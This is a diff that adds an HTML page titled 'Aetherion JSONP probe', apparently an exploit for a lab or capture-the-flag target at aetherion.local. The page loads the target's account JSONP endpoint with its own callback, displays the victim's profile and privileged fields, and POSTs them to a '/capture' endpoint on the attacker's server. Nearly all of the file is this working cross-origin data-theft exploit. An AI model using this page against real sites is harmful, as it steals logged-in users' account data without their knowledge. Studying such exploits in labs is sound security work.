@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Aetherion JSONP probe</title>
+<style>
+:root{color-scheme:dark}body{margin:0;min-height:100vh;display:grid;place-items:center;background:radial-gradient(circle at 20% 0,#1a2548,#05070e 60%);color:#dce6ff;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+.card{width:min(820px,90vw);border:1px solid #24304d;border-radius:18px;padding:30px;background:#0b1220;box-shadow:0 24px 80px #0008}
+h1{font-size:18px;letter-spacing:.12em;margin:0 0 18px}p{color:#9aacd0;line-height:1.6}pre{background:#060b15;border:1px solid #1b2439;border-radius:12px;padding:16px;white-space:pre-wrap;word-break:break-all;max-height:380px;overflow:auto;color:#b9c8e6}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>AETHERION / JSONP PROBE</h1>
+  <p>The member JSON endpoint accepts an arbitrary callback. The callback receives the victim profile and any privileged fields.</p>
+  <pre id="out">loading script...</pre>
+</div>
+<script>
+function aetherionJsonp(data) {
+  document.getElementById('out').textContent = JSON.stringify(data, null, 2);
+  fetch('/capture', {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ source: 'jsonp-profile', data })
+  });
+}
+</script>
+<script src="http://aetherion.local:8080/api/account/jsonp?callback=aetherionJsonp"></script>
+</body>
+</html>
